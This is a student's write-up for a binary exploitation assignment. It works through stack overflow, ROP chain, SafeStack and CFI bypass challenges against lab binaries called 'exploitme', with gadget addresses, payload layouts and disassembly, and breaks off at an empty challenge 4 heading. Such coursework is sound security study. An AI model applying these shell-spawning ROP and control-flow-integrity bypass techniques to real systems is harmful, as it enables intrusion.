# assignment 5

Luigi Cussigh
2023148006

## note

i use ROPgadget, a tool for finding ROP gadgets in binaries:
[https://github.com/JonathanSalwan/ROPgadget]

## challege 0

we generate characters to pad the stack frame with 'A's till we get to the return address. then we append characters
that overwrite the return address with "\x50\x11\x40\x00\x00\x00\x00\x00\x0a", which is the address of a function that calls
execve("/bin/sh", NULL, NULL)

## challenge 1

there's a null terminated string "/bin/sh" at address 0x402004:

``` plaintext
Contents of section .rodata:
 402000 01000200 2f62696e 2f736800 25730025  ..../bin/sh.%s.%
 402010 700a005b 52455355 4c545d20 4e6f7420  p..[RESULT] Not 
 402020 6578706c 6f697465 64203a28 20457869  exploited :( Exi
 402030 74696e67 20736166 656c792e 0a00456e  ting safely...En
 402040 74657220 69643a00 456e7465 72207061  ter id:.Enter pa
 402050 7373776f 72643a00                    ssword:.        
```

using ROPgadget we find a syscall gadget:

ROPgadget --binary ./exploitme | grep syscall

0x000000000040134c : syscall

also we need to set rdi, rsi, rdx, rax using pop gadgets

ROPgadget --binary ./exploitme | grep pop (register)

rdi:
(no pop for rdi, we'll have to get creative..)

rsi:
0x00000000004015e9 : pop rsi ; ret

rdx:
0x00000000004012e8 : pop rdx ; ret

rax:
(no pop for rax, we'll have to get creative..)

since we dont have rdi and rax pops (the most important ones...) we'll have to substitute:

ROPgadget --binary ./exploitme | grep "mov rdi"

rdi: // compound_gadget_0
0x0000000000401363 : mov rdi, rsi ; xor rsi, rsi ; xor rdx, rdx ; syscall

rax:
0x0000000000401230 : mov rax, rsi ; ret

we can run:

pop rsi // store 59 (0x3b) on higher address
mov rax, rsi; ret
pop rsi // store pointer to /bin/sh on higher address
mov rdi, rsi ; xor rsi, rsi ; xor rdx, rdx ; syscall // the xor's set the registers to 0 which is we want to do anyway

{} - ranges of random bytes
() - words that need to be reversed byte by byte

we'll just pass the first function:
"0A"{272 - 2 bytes of random stuff}(00000000004015e9)(000000000000003b)(0000000000401230)(00000000004015e9)(0000000000402004)(0000000000401363)'\n'
  |        |                                           |                                                     |
  |        compensate for "0A"                         value of rax                                          address to "/bin/sh"
  to escape strtol

## challenge 2

we will again use ROP gadgets to achieve the execution of syscall with rax = 59
let's find some stuff that will do at least something related to 59 or 0x3b

ROPgadget --binary ./exploitme-safestack | grep "0x3b"

we see a lot of gadgets but particularly interesting is:

0x0000000000402bd0 : add rax, 0x3b ; ret

it's very clean and it does almost what we need. we just need to find somehting to set rax to zero before executing this gadget

ROPgadget --binary ./exploitme | grep "rax"

we see:

0x0000000000402b90 : xor rax, rax ; ret

this gadget sets rax to 0. in combination with the previous gadget we can pass the execve syscall number to rax

now let's see what gadgets there are for the syscall instruction:

ROPgadget --binary ./exploitme-safestack | grep "syscall"

0x0000000000402c66 : xor rsi, rsi ; xor rdx, rdx ; syscall

we see the same compound gadget from the last challenge. we'll use it to actually perform the syscall

we need to load the address of the c-string /bin/sh to rdi. we notice that the functions:

0x0000000000402b10 <g_sh@@Base>:
0x0000000000402b10 <g_sh2@@Base>:
0x0000000000402b10 <g_sh3@@Base>:

all do that.

``` asm
402f00: 49 ff c4              inc    r12
402f03: 49 81 fc 80 00 00 00  cmp    r12,0x80
402f0a: 74 1e                 je     402f2a <main@@Base+0x7a>
402f0c: 4b 83 bc e7 00 fc ff  cmp    QWORD PTR [r15+r12*8-0x400],0x0
402f13: ff 00 
402f15: 74 e9                 je     402f00 <main@@Base+0x50>
402f17: 48 89 de              mov    rsi,rbx
402f1a: 43 ff 94 e7 00 fc ff  call   QWORD PTR [r15+r12*8-0x400]
402f21: ff 
402f22: 48 89 df              mov    rdi,rbx
402f25: 48 89 c3              mov    rbx,rax
402f28: eb d6                 jmp    402f00 <main@@Base+0x50>
```

(explanation why id needs to be 16 to write at r15 in main's unsafe stack)

having found all of the gadgets, we can proceed to compile our payload.

the id should just get the number 16, so we will just pass it:

b"16A"

this way, the second gets will start to write in the previous unsafe stack frame.

0x0000000000402b90 : xor rax, rax ; ret
0x0000000000402bd0 : add rax, 0x3b ; ret
0x0000000000402b40 : mov rdx, rax ; ret
0x0000000000402b10 : mov into rax the address of "/bin/sh"
0x0000000000402b70 : mov rax, rdx ; ret
0x0000000000402c66 : xor rsi, rsi ; xor rdx, rdx ; syscall

## challenge 3

cfi introduces a check before calling the function ptrs that are in the main's stack frame's function ptr array.

``` asm
402eee:           41 bd 80 2f 40 00     mov    r13d,0x402f80
402ef4:           31 ff                 xor    edi,edi
402ef6:           31 db                 xor    ebx,ebx
402ef8:       /-- eb 12                 jmp    402f0c <main@@Base+0x5c>
402efa:       |   66 0f 1f 44 00 00     nop    WORD PTR [rax+rax*1+0x0]
402f00: /-----|-> 49 ff c4              inc    r12
402f03: |     |   49 81 fc 80 00 00 00  cmp    r12,0x80
402f0a: |  /--|-- 74 30                 je     402f3c <main@@Base+0x8c>
402f0c: |  |  \-> 4b 83 bc e7 00 fc ff  cmp    QWORD PTR [r15+r12*8-0x400],0x0
402f13: |  |      ff 00 
402f15: +--|----- 74 e9                 je     402f00 <main@@Base+0x50>
402f17: |  |      4b 8b 84 e7 00 fc ff  mov    rax,QWORD PTR [r15+r12*8-0x400]
402f1e: |  |      ff 
402f1f: |  |      48 89 c1              mov    rcx,rax
402f22: |  |      4c 29 e9              sub    rcx,r13
402f25: |  |      48 c1 c1 3d           rol    rcx,0x3d
402f29: |  |      48 83 f9 05           cmp    rcx,0x5
402f2d: |  |  /-- 73 27                 jae    402f56 <main@@Base+0xa6>
402f2f: |  |  |   48 89 de              mov    rsi,rbx
402f32: |  |  |   ff d0                 call   rax
402f34: |  |  |   48 89 df              mov    rdi,rbx
402f37: |  |  |   48 89 c3              mov    rbx,rax
402f3a: \--|--|-- eb c4                 jmp    402f00 <main@@Base+0x50>
402f3c:    \--|-> bf 2e 31 40 00        mov    edi,0x40312e
402f41:       |   e8 9a fe ff ff        call   402de0 <g_printf@@Base>
402f46:       |   64 4d 89 3e           mov    QWORD PTR fs:[r14],r15
402f4a:       |   31 c0                 xor    eax,eax
402f4c:       |   5b                    pop    rbx
402f4d:       |   41 5c                 pop    r12
402f4f:       |   41 5d                 pop    r13
402f51:       |   41 5e                 pop    r14
402f53:       |   41 5f                 pop    r15
402f55:       |   c3                    ret
402f56:       \-> 67 0f b9 40 02        ud1    eax,DWORD PTR [eax+0x2]
402f5b:           0f 1f 44 00 00        nop    DWORD PTR [rax+rax*1+0x0]
```

the check allows only addresses that make the following statemenet true:

rol((ptr-0x402f80), 0x3d) < 0x5,

which simplifies to

ror((ptr-0x402f80), 3) < 0x5

from here we know that the last three bits have to be 0 or else we will get a value thats really really big (bigger than 0x5)

0x5 in binary is:

0000000000000000000000000000000000000000000000000000000000000101
0       8       16      24      32      40      48      56      64

so, ptr - 0x402f80 needs to be at least 1 lower than:

0000000000000000000000000000000000000000000000000000000000101000
0       8       16      24      32      40      48      56      64

(=0x28)

and has to end with 3 0s, which is the same as saying that it has to be divisible by 8.

so,

ptr - 0x402f80 should be less than 0x28 and be divisible by 8.

0x402f80 is divisible by 8, so naturally ptr should be divisible by 8 for this to work.

so we can simplify,

ptr should be less than (0x402f80 + 0x28) and be divisible by 8.
                         = 0x402fa8

this gives us a very small range of possible values of ptr:

0x402fa0
0x402f98
0x402f90
0x402f88
0x402f80

we can't go neagtive with the expression ptr - 0x402f80 because if we do, the two complement value will become something absurdly big
like 0xffff...0000

this will obv be bigger than 0x5.

let's examine the "suspect addresses":

``` asm

0000000000402fa0 <g_leak1@@Base>:
  402fa0: e9 2b fe ff ff        jmp    402dd0 <g_icall2@@Base+0x10>
  402fa5: cc                    int3
  402fa6: cc                    int3
  402fa7: cc                    int3

jumps to: (gadget_0)
  402dd0:     48 c7 c0 00 f0 ff ff  mov    rax,0xfffffffffffff000
  402dd7:     48 23 05 fa 21 00 00  and    rax,QWORD PTR [rip+0x21fa]        # 404fd8 <gaddyy@@Base+0x2048>
  402dde:     c3                    ret

0000000000402f98 <g_syscall2@@Base>:
  402f98: e9 e3 fc ff ff        jmp    402c80 <g_syscall@@Base+0x20>
  402f9d: cc                    int3
  402f9e: cc                    int3
  402f9f: cc                    int3

jumps to: (gadget_1)
  402c80: 48 89 f8              mov    rax,rdi
  402c83: 48 89 f7              mov    rdi,rsi
  402c86: 48 31 f6              xor    rsi,rsi
  402c89: 48 31 d2              xor    rdx,rdx
  402c8c: 0f 05                 syscall
  402c8e: 31 c0                 xor    eax,eax
  402c90: c3                    ret

0000000000402f90 <gaddyy@@Base>:
  402f90: e9 7b fc ff ff        jmp    402c10 <g_poprdx@@Base+0x10>
  402f95: cc                    int3
  402f96: cc                    int3
  402f97: cc                    int3

jumps to: (gadget_2)
  402c10: 48 8d 47 02           lea    rax,[rdi+0x2]
  402c14: c3                    ret

0000000000402f88 <g_sh@@Base>:
  402f88: e9 83 fb ff ff        jmp    402b10 <g_rax2rdi@@Base+0x10>
  402f8d: cc                    int3
  402f8e: cc                    int3
  402f8f: cc                    int3

jumps to: (gadget_3)
  402b10: 48 8b 05 b9 25 00 00  mov    rax,QWORD PTR [rip+0x25b9]        # 4050d0 <binsh@@Base>
  402b17: c3                    ret

0000000000402f80 <g_xxret@@Base>:
  402f80: e9 4b fb ff ff        jmp    402ad0 <g_yyret@@Base+0x10>
  402f85: cc                    int3
  402f86: cc                    int3
  402f87: cc                    int3

jumps to: (gadget_4)
  402ad0: b8 35 00 00 00        mov    eax,0x35
  402ad5: c3                    ret

```

these gadgets are basically crafted to allow us to open a shell, we just have to write the leaked addresses in the correct order

we got:

[gadget_0] - ???
0x0000000000402fa0 : mov rax, 0xfffffffffffff000 ; and rax, QWORD PTR [rip+0x21fa] ; ret;
[gadget_1] - (rax=rdi, rdi=rsi, rsi=0, rdx=0), syscall
0x0000000000402f98 : mov rax, rdi ; mov rdi, rsi ; xor rsi, rsi ; xor rdx, rdx ; syscall;
[gadget_2] - rax = rdi + 2
0x0000000000402f90 : lea rax, [rdi+0x2] ; ret;
[gadget_3] - load "/bin/sh" to rax
0x0000000000402f88 : mov rax, QWORD PTR [rip+0x25b9] ; ret;
[gadget_4] - set eax = 0x35
0x0000000000402f80 : mov eax, 0x35 ; ret;

let's examine the loop more closely:

``` asm
  402ef4:           31 ff                 xor    edi,edi
  402ef6:           31 db                 xor    ebx,ebx
  402ef8:       /-- eb 12                 jmp    402f0c <main@@Base+0x5c>
  402efa:       |   66 0f 1f 44 00 00     nop    WORD PTR [rax+rax*1+0x0]
  402f00: /-----|-> 49 ff c4              inc    r12
  402f03: |     |   49 81 fc 80 00 00 00  cmp    r12,0x80
  402f0a: |  /--|-- 74 30                 je     402f3c <main@@Base+0x8c>
  402f0c: |  |  \-> 4b 83 bc e7 00 fc ff  cmp    QWORD PTR [r15+r12*8-0x400],0x0
  402f13: |  |      ff 00 
  402f15: +--|----- 74 e9                 je     402f00 <main@@Base+0x50>
  402f17: |  |                                                                  4b 8b 84 e7 00 fc ff  mov    rax,QWORD PTR [r15+r12*8-0x400]
  402f1e: |  |                                                                  ff 
  402f1f: |  |                                                                  48 89 c1              mov    rcx,rax
  402f22: |  |                                                                  4c 29 e9              sub    rcx,r13
  402f25: |  |                                                                  48 c1 c1 3d           rol    rcx,0x3d
  402f29: |  |                                                                  48 83 f9 05           cmp    rcx,0x5
  402f2d: |  |  /--                                                             73 27                 jae    402f56 <main@@Base+0xa6>
  402f2f: |  |  |   48 89 de              mov    rsi,rbx
  402f32: |  |  |   ff d0                 call   rax
  402f34: |  |  |   48 89 df              mov    rdi,rbx
  402f37: |  |  |   48 89 c3              mov    rbx,rax
  402f3a: \--|--|-- eb c4                 jmp    402f00 <main@@Base+0x50>
```

the indented part just loads the funcptr and checks it with registers that we cant influence with our gadgets.

we can see that edi starts with 0, as well as ebx.

we can also see that rsi stores rbx before the call, rdi stores rbx after the call.

after that, rbx stores the return value of the function (rax).

if rax wasnt changed, rbx gets the funcptr value of rax.

iter0:
rdi = 0
rbx = 0
rsi = rbx = 0
4: rax = 53
rdi = rbx = 0
rbx = rax = 53

iter1:
rsi = rbx = 53
2: rax = rdi + 2 = 2
rdi = rbx = 53
rbx = rax = 2

iter2:
rsi = rbx = 2
2: rax = rdi + 2 = 55
rdi = rbx = 2
rbx = rax = 55

iter3:
rsi = rbx = 55
2: rax = rdi + 2 = 4
rdi = rbx = 55
rbx = rax = 4

iter4:
rsi = rbx = 4
2: rax = rdi + 2 = 57
rdi = rbx = 4
rbx = rax = 57

iter5:
rsi = rbx = 57
2: rax = rdi + 2 = 6
rdi = rbx = 57
rbx = rax = 6

iter6:
rsi = rbx = 6
2: rax = rdi + 2 = 59
rdi = rbx = 6
rbx = rax = 59

iter7:
rsi = rbx = 59
3: rax = /bin/sh
rdi = rbx = 59
rbx = rax = /bin/sh

iter8:
rsi = rbx = /bin/sh
1: rax = rdi = 59, rdi = rsi = /bin/sh, rsi = 0, rdx = 0 syscall!!!

so the gadget chain is 4, 2, 2, 2, 2, 2, 2, 3, 1.
which translates to writing

0000000000402f80
0000000000402f90
0000000000402f90
0000000000402f90
0000000000402f90
0000000000402f90
0000000000402f90
0000000000402f88
0000000000402f98

to the funcptr buffer.

vuln_overflow and the stack layout seems to be the same as in the last challenge, so we are going to use the same id as last time: "16A"

## challenge 4

